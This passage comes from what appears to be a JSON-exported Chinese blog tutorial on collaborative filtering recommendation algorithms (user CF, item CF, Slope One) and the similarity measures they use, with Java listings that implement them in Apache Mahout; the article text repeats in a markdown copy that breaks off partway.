class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n</code></pre>\n<p>支持文件读取的 FileDataModel，Mahout 没有对文件的格式做过多的要求，只要文件的内容满足以下格式：</p>\n<ul>\n<li>每一行包括用户 ID, 物品 ID, 用户偏好</li>\n<li>逗号隔开或者 Tab 隔开</li>\n<li>*.zip 和 *.gz 文件会自动解压缩（Mahout 建议在数据量过大时采用压缩的数据存储）</li>\n</ul>\n<p>支持数据库读取的 JDBCDataModel，Mahout 提供一个默认的 MySQL 的支持，它对用户偏好数据的存放有以下简单的要求：</p>\n<ul>\n<li>用户 ID 列需要是 BIGINT 而且非空</li>\n<li>物品 ID 列需要是 BIGINT 而且非空</li>\n<li>用户偏好列需要是 FLOAT</li>\n</ul>\n<p>建议在用户 ID 和物品 ID 上建索引。</p>\n<h3><a id=\"Recommender_279\"></a>实现推荐：Recommender</h3>\n<p>介绍完数据表示模型，下面介绍 Mahout 提供的协同过滤的推荐策略，这里我们选择其中最经典的三种，User CF, Item CF 和 Slope One。</p>\n<p><strong>User CF</strong></p>\n<p>前面已经详细介绍了 User CF 的原理，这里我们着重看怎么基于 Mahout 实现 User CF 的推荐策略，我们还是从一个例子入手：</p>\n<h5><a id=\"_3__Mahout__User_CF_287\"></a>清单 3. 基于 Mahout 实现 User CF</h5>\n<pre><code class=\"prism language-java\">DataModel model <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">FileDataModel</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">File</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"preferences.dat\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \nUserSimilarity similarity <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">PearsonCorrelationSimilarity</span><span class=\"token punctuation\">(</span>model<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \nUserNeighborhood neighborhood <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">NearestNUserNeighborhood</span><span class=\"token punctuation\">(</span><span class=\"token number\">100</span><span class=\"token punctuation\">,</span> similarity<span class=\"token punctuation\">,</span> model<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \nRecommender recommender <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">GenericUserBasedRecommender</span><span class=\"token punctuation\">(</span>model<span class=\"token punctuation\">,</span> \nneighborhood<span class=\"token punctuation\">,</span> similarity<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n</code></pre>\n<ol>\n<li>从文件建立 DataModel，我们采用前面介绍的 FileDataModel，这里假设用户的喜好信息存放在 preferences.dat 文件中。</li>\n<li>基于用户偏好数据计算用户的相似度，清单中采用的是 PearsonCorrelationSimilarity，前面章节曾详细介绍了各种计算相似度的方法，Mahout 中提供了基本的相似度的计算，它们都 UserSimilarity 这个接口，实现用户相似度的计算，包括下面这些常用的：</li>\n</ol>\n<ul>\n<li>PearsonCorrelationSimilarity：基于皮尔逊相关系数计算相似度</li>\n<li>EuclideanDistanceSimilarity：基于欧几里德距离计算相似度</li>\n<li>TanimotoCoefficientSimilarity：基于 Tanimoto 系数计算相似度</li>\n<li>UncerteredCosineSimilarity：计算 Cosine 相似度</li>\n</ul>\n<p>ItemSimilarity 也是类似的：</p>\n<ol>\n<li>根据建立的相似度计算方法，找到邻居用户。这里找邻居用户的方法根据前面我们介绍的，也包括两种：“固定数量的邻居”和“相似度门槛邻居”计算方法，Mahout 提供对应的实现：\n<ul>\n<li>NearestNUserNeighborhood：对每个用户取固定数量 N 的最近邻居</li>\n<li>ThresholdUserNeighborhood：对每个用户基于一定的限制，取落在相似度门限内的所有用户为邻居。</li>\n</ul>\n</li>\n<li>基于 DataModel，UserNeighborhood 和 UserSimilarity 构建 GenericUserBasedRecommender，实现 User CF 推荐策略。</li>\n</ol>\n<p><strong>Item CF</strong></p>\n<p>了解了 User CF，Mahout Item CF 的实现与 User CF 类似，是基于 ItemSimilarity，下面我们看实现的代码例子，它比 User CF 更简单，因为 Item CF 中并不需要引入邻居的概念：</p>\n<h5><a id=\"_4__Mahout__Item_CF_316\"></a>清单 4. 基于 Mahout 实现 Item CF</h5>\n<pre><code>`DataModel model = new FileDataModel(new File(\"preferences.dat\")); ``ItemSimilarity similarity = new PearsonCorrelationSimilarity(model); ``Recommender recommender = new GenericItemBasedRecommender(model, similarity);`\n</code></pre>\n<p><strong>Slope One</strong></p>\n<p>如前面介绍的，User CF 和 Item CF 是最常用最容易理解的两种 CF 的推荐策略，但在大数据量时，它们的计算量会很大，从而导致推荐效率较差。因此 Mahout 还提供了一种更加轻量级的 CF 推荐策略：Slope One。</p>\n<p>Slope One 是有 Daniel Lemire 和 Anna Maclachlan 在 2005 年提出的一种对基于评分的协同过滤推荐引擎的改进方法，下面简单介绍一下它的基本思想。</p>\n<p>图 5 给出了例子，假设系统对于物品 A，物品 B 和物品 C 的平均评分分别是 3，4 和 4。基于 Slope One 的方法会得到以下规律：</p>\n<ul>\n<li>用户对物品 B 的评分 = 用户对物品 A 的评分 + 1</li>\n<li>用户对物品 B 的评分 = 用户对物品 C 的评分</li>\n</ul>\n<p>基于以上的规律，我们可以对用户 A 和用户 B 的打分进行预测：</p>\n<ul>\n<li>对用户 A，他给物品 A 打分 4，那么我们可以推测他对物品 B 的评分是 5，对物品 C 的打分也是 5。</li>\n<li>对用户 B，他给物品 A 打分 2，给物品 C 打分 4，根据第一条规律，我们可以推断他对物品 B 的评分是 3；而根据第二条规律，推断出评分是 4。当出现冲突时，我们可以对各种规则得到的推断进行就平均，所以给出的推断是 3.5。</li>\n</ul>\n<p>这就是 Slope One 推荐的基本原理，它将用户的评分之间的关系看作简单的线性关系：</p>\n<p>Y = mX + b;</p>\n<p>当 m = 1 时就是 Slope One，也就是我们刚刚展示的例子。</p>\n<h5><a id=\"_5Slope_One__344\"></a>图 5.Slope One 推荐策略示例</h5>\n<p><img src=\"https://ws1.sinaimg.cn/large/006tNbRwly1fxev425is5g309i081aa6.gif\" alt=\"\"></p>\n<p>Slope One 的核心优势是在大规模的数据上，它依然能保证良好的计算速度和推荐效果。Mahout 提供了 Slope One 推荐方法的基本实现，实现代码很简单，参考清单 5.</p>\n<h5><a id=\"_5__Mahout__Slope_One_350\"></a>清单 5. 基于 Mahout 实现 Slope One</h5>\n<pre><code class=\"prism language-java\"><span class=\"token comment\">//In-Memory Recommender </span>\nDiffStorage diffStorage <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">MemoryDiffStorage</span><span class=\"token punctuation\">(</span>model<span class=\"token punctuation\">,</span> Weighting<span class=\"token punctuation\">.</span>UNWEIGHTED<span class=\"token punctuation\">,</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">,</span> \nLong<span class=\"token punctuation\">.</span>MAX_VALUE<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \nRecommender recommender <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">SlopeOneRecommender</span><span class=\"token punctuation\">(</span>model<span class=\"token punctuation\">,</span> Weighting<span class=\"token punctuation\">.</span>UNWEIGHTED<span class=\"token punctuation\">,</span> \nWeighting<span class=\"token punctuation\">.</span>UNWEIGHTED<span class=\"token punctuation\">,</span> diffStorage<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  \n \n<span class=\"token comment\">//Database-based Recommender </span>\nAbstractJDBCDataModel model <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">MySQLJDBCDataModel</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \nDiffStorage diffStorage <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">MySQLJDBCDiffStorage</span><span class=\"token punctuation\">(</span>model<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \nRecommender recommender <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">SlopeOneRecommender</span><span class=\"token punctuation\">(</span>model<span class=\"token punctuation\">,</span> Weighting<span class=\"token punctuation\">.</span>WEIGHTED<span class=\"token punctuation\">,</span> \nWeighting<span class=\"token punctuation\">.</span>WEIGHTED<span class=\"token punctuation\">,</span> diffStorage<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n</code></pre>\n<ol>\n<li>\n<p>根据 Data Model 创建数据之间线性关系的模型 DiffStorage。</p>\n</li>\n<li>\n<p>基于 Data Model 和 DiffStorage 创建 SlopeOneRecommender，实现 Slope One 推荐策略。</p>\n</li>\n</ol>\n<h2><a id=\"_370\"></a>总结</h2>\n<p>Web2.0 的一个核心思想就是“集体智慧”，基于协同过滤的推荐策略的基本思想就是基于大众行为，为每个用户提供个性化的推荐，从而使用户能更快速更准确的发现所需要的信息。从应用角度分析，现今比较成功的推荐引擎，比如 Amazon，豆瓣，当当等都采用了协同过滤的方式，它不需要对物品或者用户进行严格的建模，而且不要求物品的描述是机器可理解的，是中领域无关的推荐方法，同时这个方法计算出来的推荐是开放的，可以共用他人的经验，很好的支持用户发现潜在的兴趣偏好。基于协同过滤的推荐策略也有不同的分支，它们有不同的实用场景和推荐效果，用户可以根据自己应用的实际情况选择合适的方法，异或组合不同的方法得到更好的推荐效果。</p>\n<p>除此之外，本文还介绍了如何基于 Apache Mahout 高效实现协同过滤推荐算法，Apache Mahout 关注海量数据上的机器学习经典算法的高效实现，其中对基于协同过滤的推荐方法也提供了很好的支持，基于 Mahout 你可以轻松的体验高效推荐的神奇。</p>\n<p>作为深入推荐引擎相关算法的第一篇文章，本文深入介绍了协同过滤算法，并举例介绍了如何基于 Apache Mahout 高效实现协同过滤推荐算法，Apache Mahout 作为海量数据上的机器学习经典算法的高效实现，其中对基于协同过滤的推荐方法也提供了很好的支持，基于 Mahout 你可以轻松的体验高效推荐的神奇。但我们也发现了在海量数据上高效的运行协同过滤算法以及其他推荐策略这样高复杂的算法还是有很大的挑战的。在面对这个问题的过程中，大家提出了很多减少计算量的方法，而聚类无疑是其中最优的选择。所以本系列的下一篇文章将详细介绍各类聚类算法，它们的原理，优缺点和实用场景，并给出基于 Apache Mahout 的聚类算法的高效实现，并分析在推荐引擎的实现中，如何通过引入聚类来解决大数据量造成的海量计算，从而提供高效的推荐。</p>\n<p>最后，感谢大家对本系列的关注和支持。</p>\n\n",
			"markdowncontent":"# 深入推荐引擎相关算法 - 协同过滤\n\n## 集体智慧和协同过滤\n\n### 什么是集体智慧\n\n集体智慧 (Collective Intelligence) 并不是 Web2.0 时代特有的，只是在 Web2.0 时代，大家在 Web 应用中利用集体智慧构建更加有趣的应用或者得到更好的用户体验。集体智慧是指在大量的人群的行为和数据中收集答案，帮助你对整个人群得到统计意义上的结论，这些结论是我们在单个个体上无法得到的，它往往是某种趋势或者人群中共性的部分。\n\nWikipedia 和 Google 是两个典型的利用集体智慧的 Web 2.0 应用：\n\n- Wikipedia 是一个知识管理的百科全书，相对于传统的由领域专家编辑的百科全书，Wikipedia 允许最终用户贡献知识，随着参与人数的增多，Wikipedia 变成了涵盖各个领域的一本无比全面的知识库。也许有人会质疑它的权威性，但如果你从另一个侧面想这个问题，也许就可以迎刃而解。在发行一本书时，作者虽然是权威，但难免还有一些错误，然后通过一版一版的改版，书的内容越来越完善。而在 Wikipedia 上，这种改版和修正被变为每个人都可以做的事情，任何人发现错误或者不完善都可以贡献他们的想法，即便某些信息是错误的，但它一定也会尽快的被其他人纠正过来。从一个宏观的角度看，整个系统在按照一个良性循环的轨迹不断完善，这也正是集体智慧的魅力。\n- Google：目前最流行的搜索引擎，与 Wikipedia 不同，它没有要求用户显式的贡献，但仔细想想 Google 最核心的 PageRank 的思想，它利用了 Web 页面之间的关系，将多少其他页面链接到当前页面的数目作为衡量当前页面重要与否的标准；如果这不好理解，那么你可以把它想象成一个选举的过程，每个 Web 页面都是一个投票者同时也是一个被投票者，PageRank 通过一定数目的迭代得到一个相对稳定的评分。Google 其实利用了现在 Internet 上所有 Web 页面上链接的集体智慧，找到哪些页面是重要的。\n\n### 什么是协同过滤\n\n协同过滤是利用集体智慧的一个典型方法。要理解什么是协同过滤 (Collaborative Filtering, 简称 CF)，首先想一个简单的问题，如果你现在想看个电影，但你不知道具体看哪部，你会怎么做？大部分的人会问问周围的朋友，看看最近有什么好看的电影推荐，而我们一般更倾向于从口味比较类似的朋友那里得到推荐。这就是协同过滤的核心思想。\n\n协同过滤一般是在海量的用户中发掘出一小部分和你品位比较类似的，在协同过滤中，这些用户成为邻居，然后根据他们喜欢的其他东西组织成一个排序的目录作为推荐给你。当然其中有一个核心的问题：\n\n- 如何确定一个用户是不是和你有相似的品位？\n- 如何将邻居们的喜好组织成一个排序的目录？\n\n协同过滤相对于集体智慧而言，它从一定程度上保留了个体的特征，就是你的品位偏好，所以它更多可以作为个性化推荐的算法思想。可以想象，这种推荐策略在 Web 2.0 的长尾中是很重要的，将大众流行的东西推荐给长尾中的人怎么可能得到好的效果，这也回到推荐系统的一个核心问题：了解你的用户，然后才能给出更好的推荐。\n\n### 深入协同过滤的核心\n\n前面作为背景知识，介绍了集体智慧和协同过滤的基本思想，这一节我们将深入分析协同过滤的原理，介绍基于协同过滤思想的多种推荐机制，优缺点和实用场景。\n\n首先，要实现协同过滤，需要一下几个步骤\n\n- 收集用户偏好\n- 找到相似的用户或物品\n- 计算推荐\n\n### 收集用户偏好\n\n要从用户的行为和偏好中发现规律，并基于此给予推荐，如何收集用户的偏好信息成为系统推荐效果最基础的决定因素。用户有很多方式向系统提供自己的偏好信息，而且不同的应用也可能大不相同，下面举例进行介绍：\n\n##### 表 1 用户行为和用户偏好\n\n| **用户行为**     | **类型** | **特征**                                                     | **作用**                                                     |\n| ---------------- | -------- | ------------------------------------------------------------ | ------------------------------------------------------------ |\n| 评分             | 显式     | 整数量化的偏好，可能的取值是 [0, n]；n 一般取值为 5 或者是 10 | 通过用户对物品的评分，可以精确的得到用户的偏好               |\n| 投票             | 显式     | 布尔量化的偏好，取值是 0 或 1                                | 通过用户对物品的投票，可以较精确的得到用户的偏好             |\n| 转发             | 显式     | 布尔量化的偏好，取值是 0 或 1                                | 通过用户对物品的投票，可以精确的得到用户的偏好。 如果是站内，同时可以推理得到被转发人的偏好（不精确） |\n| 保存书签         | 显示     | 布尔量化的偏好，取值是 0 或 1                                | 通过用户对物品的投票，可以精确的得到用户的偏好。             |\n| 标记标签  (Tag)  | 显示     | 一些单词，需要对单词进行分析，得到偏好                       | 通过分析用户的标签，可以得到用户对项目的理解，同时可以分析出用户的情感：喜欢还是讨厌 |\n| 评论             | 显示     | 一段文字，需要进行文本分析，得到偏好                         | 通过分析用户的评论，可以得到用户的情感：喜欢还是讨厌         |\n| 点击流  ( 查看 ) | 隐式     | 一组用户的点击，用户对物品感兴趣，需要进行分析，得到偏好     | 用户的点击一定程度上反映了用户的注意力，所以它也可以从一定程度上反映用户的喜好。 |\n| 页面停留时间     | 隐式     | 一组时间信息，噪音大，需要进行去噪，分析，得到偏好           | 用户的页面停留时间一定程度上反映了用户的注意力和喜好，但噪音偏大，不好利用。 |\n| 购买             | 隐式     | 布尔量化的偏好，取值是 0 或 1                                | 用户的购买是很明确的说明这个项目它感兴趣。                   |\n\n以上列举的用户行为都是比较通用的，推荐引擎设计人员可以根据自己应用的特点添加特殊的用户行为，并用他们表示用户对物品的喜好。\n\n在一般应用中，我们提取的用户行为一般都多于一种，关于如何组合这些不同的用户行为，基本上有以下两种方式：\n\n- 将不同的行为分组：一般可以分为“查看”和“购买”等等，然后基于不同的行为，计算不同的用户 / 物品相似度。类似于当当网或者 Amazon 给出的“购买了该图书的人还购买了 ...”，“查看了图书的人还查看了 ...”\n- 根据不同行为反映用户喜好的程度将它们进行加权，得到用户对于物品的总体喜好。一般来说，显式的用户反馈比隐式的权值大，但比较稀疏，毕竟进行显示反馈的用户是少数；同时相对于“查看”，“购买”行为反映用户喜好的程度更大，但这也因应用而异。\n\n收集了用户行为数据，我们还需要对数据进行一定的预处理，其中最核心的工作就是：减噪和归一化。\n\n- 减噪：用户行为数据是用户在使用应用过程中产生的，它可能存在大量的噪音和用户的误操作，我们可以通过经典的数据挖掘算法过滤掉行为数据中的噪音，这样可以是我们的分析更加精确。\n- 归一化：如前面讲到的，在计算用户对物品的喜好程度时，可能需要对不同的行为数据进行加权。但可以想象，不同行为的数据取值可能相差很大，比如，用户的查看数据必然比购买数据大的多，如何将各个行为的数据统一在一个相同的取值范围中，从而使得加权求和得到的总体喜好更加精确，就需要我们进行归一化处理。最简单的归一化处理，就是将各类数据除以此类中的最大值，以保证归一化后的数据取值在 [0,1] 范围中。\n\n进行的预处理后，根据不同应用的行为分析方法，可以选择分组或者加权处理，之后我们可以得到一个用户偏好的二维矩阵，一维是用户列表，另一维是物品列表，值是用户对物品的偏好，一般是 [0,1] 或者 [-1, 1] 的浮点数值。\n\n### 找到相似的用户或物品\n\n当已经对用户行为进行分析得到用户喜好后，我们可以根据用户喜好计算相似用户和物品，然后基于相似用户或者物品进行推荐，这就是最典型的 CF 的两个分支：基于用户的 CF 和基于物品的 CF。这两种方法都需要计算相似度，下面我们先看看最基本的几种计算相似度的方法。\n\n**相似度的计算**\n\n关于相似度的计算，现有的几种基本方法都是基于向量（Vector）的，其实也就是计算两个向量的距离，距离越近相似度越大。在推荐的场景中，在用户 - 物品偏好的二维矩阵中，我们可以将一个用户对所有物品的偏好作为一个向量来计算用户之间的相似度，或者将所有用户对某个物品的偏好作为一个向量来计算物品之间的相似度。下面我们详细介绍几种常用的相似度计算方法：\n\n- 欧几里德距离（Euclidean Distance）\n\n最初用于计算欧几里德空间中两个点的距离，假设 x，y 是 n 维空间的两个点，它们之间的欧几里德距离是：\n\n![Figure xxx. Requires a heading](https://www.ibm.com/developerworks/cn/web/1103_zhaoct_recommstudy2/image003.gif)\n\n可以看出，当 n=2 时，欧几里德距离就是平面上两个点的距离。欧几里德学习视频： [《机器学习Python实践》#15 欧几里得距离](https://www.yxgapp.com/video/c8426884-2b56-494f-a274-0aa3105503f1.html)\n\n当用欧几里德距离表示相似度，一般采用以下公式进行转换：距离越小，相似度越大\n\n![Figure xxx. Requires a heading](https://www.ibm.com/developerworks/cn/web/1103_zhaoct_recommstudy2/image005.gif)\n\n- 皮尔逊相关系数（Pearson Correlation Coefficient）\n\n皮尔逊相关系数一般用于计算两个定距变量间联系的紧密程度，它的取值在 [-1，+1] 之间。\n\n![Figure xxx. Requires a heading](https://www.ibm.com/developerworks/cn/web/1103_zhaoct_recommstudy2/image007.gif)\n\n\n\nsx, sy是 x 和 y 的样品标准偏差。\n\n- Cosine 相似度（Cosine Similarity）\n\nCosine 相似度被广泛应用于计算文档数据的相似度：\n\n![Figure xxx. Requires a heading](https://www.ibm.com/developerworks/cn/web/1103_zhaoct_recommstudy2/image009.gif)\n\n\n\n\n\n- Tanimoto 系数（Tanimoto Coefficient）\n\nTanimoto 系数也称为 Jaccard 系数，是 Cosine 相似度的扩展，也多用于计算文档数据的相似度：\n\n![Figure xxx. Requires a heading](https://www.ibm.com/developerworks/cn/web/1103_zhaoct_recommstudy2/image011.gif)\n\n**相似邻居的计算**\n\n介绍完相似度的计算方法，下面我们看看如何根据相似度找到用户 - 物品的邻居，常用的挑选邻居的原则可以分为两类：图 1 给出了二维平面空间上点集的示意图。\n\n- 固定数量的邻居：K-neighborhoods 或者 Fix-size neighborhoods\n\n不论邻居的“远近”，只取最近的 K 个，作为其邻居。如图 1 中的 A，假设要计算点 1 的 5- 邻居，那么根据点之间的距离，我们取最近的 5 个点，分别是点 2，点 3，点 4，点 7 和点 5。但很明显我们可以看出，这种方法对于孤立点的计算效果不好，因为要取固定个数的邻居，当它附近没有足够多比较相似的点，就被迫取一些不太相似的点作为邻居，这样就影响了邻居相似的程度，比如图 1 中，点 1 和点 5 其实并不是很相似。\n\n- 基于相似度门槛的邻居：Threshold-based neighborhoods\n\n与计算固定数量的邻居的原则不同，基于相似度门槛的邻居计算是对邻居的远近进行最大值的限制，落在以当前点为中心，距离为 K 的区域中的所有点都作为当前点的邻居，这种方法计算得到的邻居个数不确定，但相似度不会出现较大的误差。如图 1 中的 B，从点 1 出发，计算相似度在 K 内的邻居，得到点 2，点 3，点 4 和点 7，这种方法计算出的邻居的相似度程度比前一种优，尤其是对孤立点的处理。\n\n##### 图 1.相似邻居计算示意图\n\n![](https://ws4.sinaimg.cn/large/006tNbRwly1fxev00vhkxg30ej08iwef.gif)\n\n### 计算推荐\n\n经过前期的计算已经得到了相邻用户和相邻物品，下面介绍如何基于这些信息为用户进行推荐。本系列的上一篇综述文章已经简要介绍过基于协同过滤的推荐算法可以分为基于用户的 CF 和基于物品的 CF，下面我们深入这两种方法的计算方法，使用场景和优缺点。\n\n**基于用户的 CF（User CF）**\n\n基于用户的 CF 的基本思想相当简单，基于用户对物品的偏好找到相邻邻居用户，然后将邻居用户喜欢的推荐给当前用户。计算上，就是将一个用户对所有物品的偏好作为一个向量来计算用户之间的相似度，找到 K 邻居后，根据邻居的相似度权重以及他们对物品的偏好，预测当前用户没有偏好的未涉及物品，计算得到一个排序的物品列表作为推荐。图 2 给出了一个例子，对于用户 A，根据用户的历史偏好，这里只计算得到一个邻居 - 用户 C，然后将用户 C 喜欢的物品 D 推荐给用户 A。\n\n##### 图 2.基于用户的 CF 的基本原理\n\n![](https://ws3.sinaimg.cn/large/006tNbRwly1fxev0k5q29g30aw08wglm.gif)\n\n**基于物品的 CF（Item CF）**\n\n基于物品的 CF 的原理和基于用户的 CF 类似，只是在计算邻居时采用物品本身，而不是从用户的角度，即基于用户对物品的偏好找到相似的物品，然后根据用户的历史偏好，推荐相似的物品给他。从计算的角度看，就是将所有用户对某个物品的偏好作为一个向量来计算物品之间的相似度，得到物品的相似物品后，根据用户历史的偏好预测当前用户还没有表示偏好的物品，计算得到一个排序的物品列表作为推荐。图 3 给出了一个例子，对于物品 A，根据所有用户的历史偏好，喜欢物品 A 的用户都喜欢物品 C，得出物品 A 和物品 C 比较相似，而用户 C 喜欢物品 A，那么可以推断出用户 C 可能也喜欢物品 C。\n\n##### 图 3.基于物品的 CF 的基本原理\n\n![\u0086](https://ws2.sinaimg.cn/large/006tNbRwly1fxev0tb00rg30aa099glm.gif)\n\n**User CF vs. Item CF**\n\n前面介绍了 User CF 和 Item CF 的基本原理，下面我们分几个不同的角度深入看看它们各自的优缺点和适用场景：\n\n- 计算复杂度\n\nItem CF 和 User CF 是基于协同过滤推荐的两个最基本的算法，User CF 是很早以前就提出来了，Item CF 是从 Amazon 的论文和专利发表之后（2001 年左右）开始流行，大家都觉得 Item CF 从性能和复杂度上比 User CF 更优，其中的一个主要原因就是对于一个在线网站，用户的数量往往大大超过物品的数量，同时物品的数据相对稳定，因此计算物品的相似度不但计算量较小，同时也不必频繁更新。但我们往往忽略了这种情况只适应于提供商品的电子商务网站，对于新闻，博客或者微内容的推荐系统，情况往往是相反的，物品的数量是海量的，同时也是更新频繁的，所以单从复杂度的角度，这两个算法在不同的系统中各有优势，推荐引擎的设计者需要根据自己应用的特点选择更加合适的算法。\n\n- 适用场景\n\n在非社交网络的网站中，内容内在的联系是很重要的推荐原则，它比基于相似用户的推荐原则更加有效。比如在购书网站上，当你看一本书的时候，推荐引擎会给你推荐相关的书籍，这个推荐的重要性远远超过了网站首页对该用户的综合推荐。可以看到，在这种情况下，Item CF 的推荐成为了引导用户浏览的重要手段。同时 Item CF 便于为推荐做出解释，在一个非社交网络的网站中，给某个用户推荐一本书，同时给出的解释是某某和你有相似兴趣的人也看了这本书，这很难让用户信服，因为用户可能根本不认识那个人；但如果解释说是因为这本书和你以前看的某本书相似，用户可能就觉得合理而采纳了此推荐。\n\n相反的，在现今很流行的社交网络站点中，User CF 是一个更不错的选择，User CF 加上社会网络信息，可以增加用户对推荐解释的信服程度。\n\n- 推荐多样性和精度\n\n研究推荐引擎的学者们在相同的数据集合上分别用 User CF 和 Item CF 计算推荐结果，发现推荐列表中，只有 50% 是一样的，还有 50% 完全不同。但是这两个算法确有相似的精度，所以可以说，这两个算法是很互补的。\n\n关于推荐的多样性，有两种度量方法：\n\n第一种度量方法是从单个用户的角度度量，就是说给定一个用户，查看系统给出的推荐列表是否多样，也就是要比较推荐列表中的物品之间两两的相似度，不难想到，对这种度量方法，Item CF 的多样性显然不如 User CF 的好，因为 Item CF 的推荐就是和以前看的东西最相似的。\n\n第二种度量方法是考虑系统的多样性，也被称为覆盖率 (Coverage)，它是指一个推荐系统是否能够提供给所有用户丰富的选择。在这种指标下，Item CF 的多样性要远远好于 User CF, 因为 User CF 总是倾向于推荐热门的，从另一个侧面看，也就是说，Item CF 的推荐有很好的新颖性，很擅长推荐长尾里的物品。所以，尽管大多数情况，Item CF 的精度略小于 User CF， 但如果考虑多样性，Item CF 却比 User CF 好很多。\n\n如果你对推荐的多样性还心存疑惑，那么下面我们再举个实例看看 User CF 和 Item CF 的多样性到底有什么差别。首先，假设每个用户兴趣爱好都是广泛的，喜欢好几个领域的东西，不过每个用户肯定也有一个主要的领域，对这个领域会比其他领域更加关心。给定一个用户，假设他喜欢 3 个领域 A,B,C，A 是他喜欢的主要领域，这个时候我们来看 User CF 和 Item CF 倾向于做出什么推荐：如果用 User CF, 它会将 A,B,C 三个领域中比较热门的东西推荐给用户；而如果用 ItemCF，它会基本上只推荐 A 领域的东西给用户。所以我们看到因为 User CF 只推荐热门的，所以它在推荐长尾里项目方面的能力不足；而 Item CF 只推荐 A 领域给用户，这样他有限的推荐列表中就可能包含了一定数量的不热门的长尾物品，同时 Item CF 的推荐对这个用户而言，显然多样性不足。但是对整个系统而言，因为不同的用户的主要兴趣点不同，所以系统的覆盖率会比较好。\n\n从上面的分析，可以很清晰的看到，这两种推荐都有其合理性，但都不是最好的选择，因此他们的精度也会有损失。其实对这类系统的最好选择是，如果系统给这个用户推荐 30 个物品，既不是每个领域挑选 10 个最热门的给他，也不是推荐 30 个 A 领域的给他，而是比如推荐 15 个 A 领域的给他，剩下的 15 个从 B,C 中选择。所以结合 User CF 和 Item CF 是最优的选择，结合的基本原则就是当采用 Item CF 导致系统对个人推荐的多样性不足时，我们通过加入 User CF 增加个人推荐的多样性，从而提高精度，而当因为采用 User CF 而使系统的整体多样性不足时，我们可以通过加入 Item CF 增加整体的多样性，同样同样可以提高推荐的精度。\n\n- 用户对推荐算法的适应度\n\n前面我们大部分都是从推荐引擎的角度考虑哪个算法更优，但其实我们更多的应该考虑作为推荐引擎的最终使用者 -- 应用用户对推荐算法的适应度。\n\n对于 User CF，推荐的原则是假设用户会喜欢那些和他有相同喜好的用户喜欢的东西，但如果一个用户没有相同喜好的朋友，那 User CF 的算法的效果就会很差，所以一个用户对的 CF 算法的适应度是和他有多少共同喜好用户成正比的。\n\nItem CF 算法也有一个基本假设，就是用户会喜欢和他以前喜欢的东西相似的东西，那么我们可以计算一个用户喜欢的物品的自相似度。一个用户喜欢物品的自相似度大，就说明他喜欢的东西都是比较相似的，也就是说他比较符合 Item CF 方法的基本假设，那么他对 Item CF 的适应度自然比较好；反之，如果自相似度小，就说明这个用户的喜好习惯并不满足 Item CF 方法的基本假设，那么对于这种用户，用 Item CF 方法做出好的推荐的可能性非常低。\n\n通过以上的介绍，相信大家已经对协同过滤推荐的各种方法，原则，特点和适用场景有深入的了解，下面我们就进入实战阶段，重点介绍如何基于 Apache Mahout 实现协同过滤推荐算法。\n\n## 基于 Apache Mahout 实现高效的协同过滤推荐\n\nApache Mahout 是 Apache Software Foundation (ASF) 旗下的一个开源项目，提供一些可扩展的机器学习领域经典算法的实现，旨在帮助开发人员更加方便快捷地创建智能应用程序，并且，在 Mahout 的最近版本中还加入了对 Apache Hadoop 的支持，使这些算法可以更高效的运行在云计算环境中。\n\n关于 Apache Mahout 的安装和配置请参考《基于 Apache Mahout 构建社会化推荐引擎》，它是笔者 09 年发表的一篇关于基于 Mahout 实现推荐引擎的 developerWorks 文章，其中详细介绍了 Mahout 的安装步骤，并给出一个简单的电影推荐引擎的例子。\n\nApache Mahout 中提供的一个协同过滤算法的高效实现，它是一个基于 Java 实现的可扩展的，高效的推荐引擎。图 4 给出了 Apache Mahout 中协同过滤推荐实现的组件图，下面我们逐步深入介绍各个部分。\n\n##### 图 4.组件图\n\n![](https://ws3.sinaimg.cn/large/006tNbRwly1fxev2pr7jeg30cs09zglj.gif)\n\n### 数据表示：Data Model\n\n**Preference**\n\n基于协同过滤的推荐引擎的输入是用户的历史偏好信息，在 Mahout 里它被建模为 Preference（接口），一个 Preference 就是一个简单的三元组 < 用户 ID, 物品 ID, 用户偏好 >，它的实现类是 GenericPreference，可以通过以下语句创建一个 GenericPreference。\n\nGenericPreference preference = new GenericPreference(123, 456, 3.0f);\n\n这其中， 123 是用户 ID，long 型；456 是物品 ID，long 型；3.0f 是用户偏好，float 型。从这个例子我们可以看出，单单一个 GenericPreference 的数据就占用 20 bytes，所以你会发现如果只简单实用数组 Array 加载用户偏好数据，必然占用大量的内存，Mahout 在这方面做了一些优化，它创建了 PreferenceArray（接口）保存一组用户偏好数据，为了优化性能，Mahout 给出了两个实现类，GenericUserPreferenceArray 和 GenericItemPreferenceArray，分别按照用户和物品本身对用户偏好进行组装，这样就可以压缩用户 ID 或者物品 ID 的空间。下面清单 1 的代码以 GenericUserPreferenceArray 为例，展示了如何创建和使用一个 PreferenceArray。\n\n##### 清单 1. 创建和使用 PreferenceArray\n\n```java\nPreferenceArray userPref = new GenericUserPreferenceArray(2); //size = 2 \n \nuserPref.setUserID(0, 1L); \n \nuserPref.setItemID(0, 